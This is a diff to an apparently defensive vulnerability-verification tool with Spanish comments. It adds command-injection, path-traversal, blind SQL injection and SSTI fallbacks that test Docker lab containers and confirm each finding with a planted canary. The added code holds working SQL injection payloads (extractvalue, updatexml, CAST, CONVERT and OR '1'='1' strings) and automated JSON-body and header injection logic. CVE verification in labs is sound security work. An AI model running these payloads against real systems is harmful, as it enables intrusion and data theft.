@@ -23,7 +23,7 @@ import time
 from typing import Callable, List, Optional
 
 from .wpverify import (WpVerifyResult, _ALPINE_IMAGE, _FILE_UPLOAD_HINTS, _ID_HINTS, _PATH_HINTS,
-                       _UPLOAD_BINARY_SUFFIXES,
+                       _UPLOAD_BINARY_SUFFIXES, _HEADER_INJECTION_HINTS,
                        _REDIRECT_HINTS, _SQLI_HINTS, _URL_HINTS, _XML_HINTS, _XSS_HINTS,
                        _XssBrowserSession, _docker_daemon_ok, _http_request,
                        _http_request_raw_path, _lab_host,
@@ -1195,12 +1195,65 @@ def verify_generic_command_injection(
                           f"inyeccion contra {endpoint} pero ninguna hizo aparecer el canario -- "
                           f"no se confirmo command injection (puede que el endpoint/parametro no "
                           f"sean los reales, o que la entrada no llegue a una shell sin filtrar)")
+            # JSON body injection fallback: retry each form with Content-Type: application/json
+            if m != "GET" and not res.verified:
+                step("CMDI: probando inyeccion via JSON body (Content-Type: application/json)...")
+                for pname in candidate_params[:3]:
+                    if res.verified:
+                        break
+                    for form in payload_forms[:6]:
+                        _jbody = dict(parameters) if isinstance(parameters, dict) else {}
+                        _jbody[pname] = form
+                        try:
+                            _jresp = _http_request(m, base_url + endpoint, timeout=15,
+                                                   json=_jbody,
+                                                   headers={"Content-Type": "application/json",
+                                                            **(custom_headers or {})})
+                            # Check if canary appeared in response or on filesystem
+                            _jbody_txt = getattr(_jresp, "text", "") or ""
+                            if secret in _jbody_txt:
+                                res.verified = True
+                                res.ok = True
+                                res.confidence = "confirmed"
+                                res.evidence.update({
+                                    "tecnica": "command-injection-json-body",
+                                    "parametro_ganador": pname,
+                                    "payload_ganador": form,
+                                    "respuesta_cuerpo_recorte": _jbody_txt[:500],
+                                })
+                                res.detail = (f"COMMAND INJECTION via JSON body confirmada: "
+                                              f"'{pname}'={form!r} hizo aparecer el canario en la respuesta")
+                                step(f"CMDI JSON body VERIFICADO: '{pname}'")
+                                break
+                            # Also check canary on filesystem
+                            _ci_check = subprocess.run(
+                                ["docker", "exec", container, "cat", canary_path],
+                                capture_output=True, text=True, timeout=5)
+                            if secret in (_ci_check.stdout or ""):
+                                res.verified = True
+                                res.ok = True
+                                res.confidence = "confirmed"
+                                res.evidence.update({
+                                    "tecnica": "command-injection-json-body",
+                                    "parametro_ganador": pname,
+                                    "payload_ganador": form,
+                                })
+                                res.detail = (f"COMMAND INJECTION via JSON body confirmada: "
+                                              f"'{pname}'={form!r} escribio el canario en disco")
+                                step(f"CMDI JSON body VERIFICADO (canario en disco): '{pname}'")
+                                break
+                        except Exception:
+                            pass
+        if not res.verified and res.confidence == "none":
+            res.confidence = "inconclusive"
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = _diagnose_infra_error(e, source_dir)
+        res.confidence = "not_reproducible"
         return res
     except Exception as e:
         res.detail = _diagnose_infra_error(e, source_dir)
+        res.confidence = "not_reproducible"
         return res
     finally:
         step("desmontando el laboratorio generico (contenedores/red/imagen)...")
@@ -1214,6 +1267,7 @@ def verify_generic_path_traversal(
     url_suffix: str = "", custom_headers: Optional[dict] = None,
     query_suffix: str = "",
     dockerfile_body: str = "", extra_files: Optional[dict] = None,
+    _tried_params_set: Optional[frozenset] = None,
 ) -> WpVerifyResult:
     """Analogo generico de verify_wordpress_path_traversal (wpverify.py): planta un fichero
     canario con un secreto aleatorio DENTRO del contenedor real del objetivo (via `docker exec`,
@@ -1570,12 +1624,44 @@ def verify_generic_path_traversal(
                           f"candidato(s) y ninguna devolvio el secreto plantado -- el traversal "
                           f"no se confirmo (puede necesitar otra profundidad/codificacion, o el "
                           f"endpoint/parametro no son los reales)")
+        # LFI param fuzzing for generic verifier (like verify_wordpress_path_traversal)
+        _gen_path_param = win_pp or path_param_hint or ""
+        if (not res.verified and parameters
+                and (_tried_params_set is None or len(_tried_params_set) < 4)):
+            _gen_already = (_tried_params_set or frozenset()) | {_gen_path_param}
+            _gen_names = (list(parameters.keys()) if isinstance(parameters, dict)
+                          else list(parameters))
+            _gen_cands = []
+            for _h in _PATH_HINTS:
+                for _pn in _gen_names:
+                    if _h in _pn.lower() and _pn not in _gen_already and _pn not in _gen_cands:
+                        _gen_cands.append(_pn)
+            if _gen_cands:
+                _gen_next = _gen_cands[0]
+                _gen_budget = max(60.0, budget_s * 0.4)
+                step(f"LFI generic param fuzzing: '{_gen_path_param}' sin canario; "
+                     f"probando siguiente candidato '{_gen_next}'...")
+                _gen_rot = verify_generic_path_traversal(
+                    source_dir, endpoint, http_method, parameters,
+                    path_param_hint=_gen_next, on_step=on_step,
+                    budget_s=_gen_budget, setup_commands=setup_commands,
+                    url_suffix=url_suffix, custom_headers=custom_headers,
+                    query_suffix=query_suffix,
+                    dockerfile_body=dockerfile_body, extra_files=extra_files,
+                    _tried_params_set=_gen_already,
+                )
+                if _gen_rot.verified:
+                    return _gen_rot
+        if not res.verified and res.confidence == "none":
+            res.confidence = "inconclusive"
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = _diagnose_infra_error(e, source_dir)
+        res.confidence = "not_reproducible"
         return res
     except Exception as e:
         res.detail = _diagnose_infra_error(e, source_dir)
+        res.confidence = "not_reproducible"
         return res
     finally:
         step("desmontando el laboratorio generico (contenedores/red/imagen)...")
@@ -2462,6 +2548,8 @@ def verify_generic_sqli_blind(
     dockerfile_body: str = "",
     extra_files: Optional[dict] = None,
     confirm_string: str = "",
+    _tried_params_set: Optional[frozenset] = None,
+    sqli_header_hint: str = "",
 ) -> WpVerifyResult:
     """SQL injection ciega por TIEMPO contra cualquier objetivo con su propio Dockerfile/compose.
     Deliberadamente mas limitada que verify_wordpress_sqli: sin saber el motor real de BD (puede
@@ -2546,6 +2634,44 @@ def verify_generic_sqli_blind(
 
         res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                              "metodo": m, "sqli_param": sqli_param})
+
+        # Fast path: try error-based SQLi BEFORE slow time-based probes — covers MySQL, Postgres, MSSQL.
+        # Saves ~30-60s per CVE when the target responds with an error instead of staying silent.
+        step("intento rapido error-based (extractvalue/updatexml) antes de time-based...")
+        _eb_payloads = {
+            "mysql_xp": f"{orig_value}' AND extractvalue(1,concat(0x7e,version()))-- -",
+            "mysql_ux": f"{orig_value}' AND updatexml(1,concat(0x7e,version()),1)-- -",
+            "mysql_xp2": f"{orig_value} AND extractvalue(1,concat(0x7e,version()))-- -",
+            "pg_cast": f"{orig_value}' AND CAST(version() AS INTEGER)-- -",
+            "mssql_conv": f"{orig_value}' AND 1=CONVERT(int,@@version)-- -",
+        }
+        _eb_sigs = ("extractvalue", "XPATH syntax error", "updatexml", "SQL syntax",
+                    "mysql_num_rows", "PG::InvalidTextRepresentation",
+                    "Conversion failed when converting", "ODBC SQL Server Driver")
+        for _eb_key, _eb_p in _eb_payloads.items():
+            try:
+                _eb_pl = dict(base_params); _eb_pl[sqli_param] = _eb_p
+                _eb_r = _http_request(m, base_url + endpoint_path, timeout=15,
+                                      params=_eb_pl if m == "GET" else None,
+                                      data=_eb_pl if m != "GET" else None,
+                                      headers=custom_headers or None)
+                _eb_body = getattr(_eb_r, "text", "") or ""
+                if any(sig in _eb_body for sig in _eb_sigs):
+                    res.verified = True
+                    res.ok = True
+                    res.confidence = "confirmed"
+                    res.evidence.update({
+                        "tecnica": "error-based",
+                        "variante_eb": _eb_key,
+                        "payload_ganador": _eb_p,
+                        "respuesta_cuerpo_recorte": _eb_body[:500],
+                    })
+                    res.detail = (f"SQLI ERROR-BASED confirmada (ruta rapida): "
+                                  f"'{sqli_param}={_eb_p!r}' devolvio error de motor SQL")
+                    step(f"VERIFICADO en ruta rapida error-based ({_eb_key})!")
+                    return res
+            except Exception:
+                pass
 
         step("midiendo tiempos de respuesta de control (sin inyeccion)...")
         base_times = [t for t in (timed_send(orig_value, capture_body=True),
@@ -2887,12 +3013,90 @@ def verify_generic_sqli_blind(
                           f"ciega por tiempo no se confirmo (puede que el endpoint/parametro no "
                           f"sean los reales, que el motor no soporte ninguno de los dialectos "
                           f"probados, o que de verdad no haya inyeccion)")
+            # SQLi param rotation for generic verifier (like verify_wordpress_sqli)
+            _gen_sqli_param = sqli_param or sqli_param_hint or ""
+            if (not res.verified and parameters
+                    and (_tried_params_set is None or len(_tried_params_set) < 3)):
+                _gen_already_s = (_tried_params_set or frozenset()) | {_gen_sqli_param}
+                _gen_names_s = (list(parameters.keys()) if isinstance(parameters, dict)
+                                else list(parameters))
+                _gen_cands_s = []
+                for _h in _SQLI_HINTS:
+                    for _pn in _gen_names_s:
+                        if _h in _pn.lower() and _pn not in _gen_already_s and _pn not in _gen_cands_s:
+                            _gen_cands_s.append(_pn)
+                if _gen_cands_s:
+                    _gen_next_s = _gen_cands_s[0]
+                    _gen_budget_s = max(60.0, budget_s * 0.4)
+                    step(f"SQLi generic param rotation: '{_gen_sqli_param}' sin señal; "
+                         f"probando siguiente candidato '{_gen_next_s}'...")
+                    _gen_rot_s = verify_generic_sqli_blind(
+                        source_dir, endpoint, http_method, parameters,
+                        sqli_param_hint=_gen_next_s, on_step=on_step,
+                        budget_s=_gen_budget_s,
+                        sqli_identifier_table_hint=sqli_identifier_table_hint,
+                        custom_headers=custom_headers, setup_commands=setup_commands,
+                        dockerfile_body=dockerfile_body, extra_files=extra_files,
+                        confirm_string=confirm_string,
+                        _tried_params_set=_gen_already_s,
+                    )
+                    if _gen_rot_s.verified:
+                        return _gen_rot_s
+            if not res.verified and res.confidence == "none":
+                res.confidence = "inconclusive"
+        # --- Header injection fallback (generic) ---
+        if not res.verified:
+            _gen_hdr_cands = []
+            if sqli_header_hint:
+                _gen_hdr_cands = [sqli_header_hint]
+            else:
+                _hyp_txt = str(parameters) + str(endpoint)
+                for _hdr in _HEADER_INJECTION_HINTS:
+                    if _hdr.lower().replace("-", "_") in _hyp_txt.lower():
+                        _gen_hdr_cands.append(_hdr)
+            for _inject_hdr in _gen_hdr_cands[:3]:
+                step(f"header injection fallback: probando error-based SQLi en header '{_inject_hdr}'...")
+                _hdr_probes = [
+                    "1' AND extractvalue(1,concat(0x7e,version()))-- -",
+                    "1 AND 1=CONVERT(int,@@version)-- -",
+                    "1' OR '1'='1",
+                ]
+                for _hp in _hdr_probes:
+                    try:
+                        _all_hdrs = dict(custom_headers or {})
+                        _all_hdrs[_inject_hdr] = _hp
+                        _hr = _http_request(m, base_url + endpoint_path, timeout=15,
+                                            params=base_params if m == "GET" else None,
+                                            data=base_params if m != "GET" else None,
+                                            headers=_all_hdrs)
+                        _body = _hr.text if hasattr(_hr, "text") else str(_hr)
+                        if any(sig in _body for sig in ("extractvalue", "XPATH syntax error",
+                                                         "SQL syntax", "ODBC SQL",
+                                                         "mysql_num_rows")):
+                            res.verified = True
+                            res.ok = True
+                            res.confidence = "confirmed"
+                            res.evidence.update({
+                                "tecnica": "error-based-header-injection",
+                                "header": _inject_hdr,
+                                "payload_ganador": _hp,
+                                "respuesta_cuerpo_recorte": _body[:500],
+                            })
+                            res.detail = (f"SQLi via header '{_inject_hdr}' = {_hp!r} produjo error SQL")
+                            step(f"VERIFICADO via header: '{_inject_hdr}'")
+                            break
+                    except Exception:
+                        pass
+                if res.verified:
+                    break
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = _diagnose_infra_error(e, source_dir)
+        res.confidence = "not_reproducible"
         return res
     except Exception as e:
         res.detail = _diagnose_infra_error(e, source_dir)
+        res.confidence = "not_reproducible"
         return res
     finally:
         step("desmontando el laboratorio generico (contenedores/red/imagen)...")
@@ -3477,6 +3681,47 @@ def verify_generic_ssti(
             tried_all.extend(tried)
             if found:
                 break
+
+        # --- JSON body injection for SSTI (API endpoints that only accept Content-Type: application/json) ---
+        if not found and m != "GET":
+            step("SSTI: probando inyeccion via JSON body (API endpoints con Content-Type: application/json)...")
+            _json_cands = [(win_param or ssti_param, cand_params)]
+            if not (win_param or ssti_param) and parameters:
+                _pnames = list(parameters.keys()) if isinstance(parameters, dict) else list(parameters)
+                _json_cands = [(_pn, parameters) for _pn in _pnames[:3]]
+            for _jp, _jp_params in _json_cands:
+                if not _jp:
+                    continue
+                for payload_value, payload_expected in attempt_pairs[:6]:
+                    pattern = re.compile(rf"(?<!\d){payload_expected}(?!\d)")
+                    _jbody = dict(_jp_params) if isinstance(_jp_params, dict) else {}
+                    _jbody[_jp] = payload_value
+                    try:
+                        resp = _http_request(m, base_url + (win_ep or endpoint or "/"),
+                                             timeout=15,
+                                             json=_jbody,
+                                             headers={"Content-Type": "application/json",
+                                                      **(custom_headers or {})})
+                        matched = bool(pattern.search(resp.text or ""))
+                        if matched:
+                            found = True
+                            win_param = _jp
+                            res.evidence["payload_ganador"] = payload_value
+                            res.evidence["resultado_esperado_ganador"] = payload_expected
+                            res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
+                            res.evidence["tecnica"] = "ssti-json-body"
+                            step(f"SSTI JSON body VERIFICADO: '{_jp}'={payload_value!r} → {payload_expected}")
+                            _add_exploit_evidence(
+                                res=res, method=m, url=base_url + (win_ep or endpoint or "/"),
+                                resp_or_body=resp, highlight=str(payload_expected),
+                                caption_es=f"SSTI via JSON body CONFIRMADA: '{_jp}'={payload_value!r} → {payload_expected}",
+                                caption_en=f"SSTI via JSON body CONFIRMED: '{_jp}'={payload_value!r} → {payload_expected}",
+                            )
+                            break
+                    except Exception:
+                        pass
+                if found:
+                    break
 
         # --- Multi-step SSTI: upload-then-render (e.g. CVE-2026-27641 flask-reuploaded) --------
         # Algunos ataques SSTI requieren dos peticiones: (1) subir un fichero que contiene
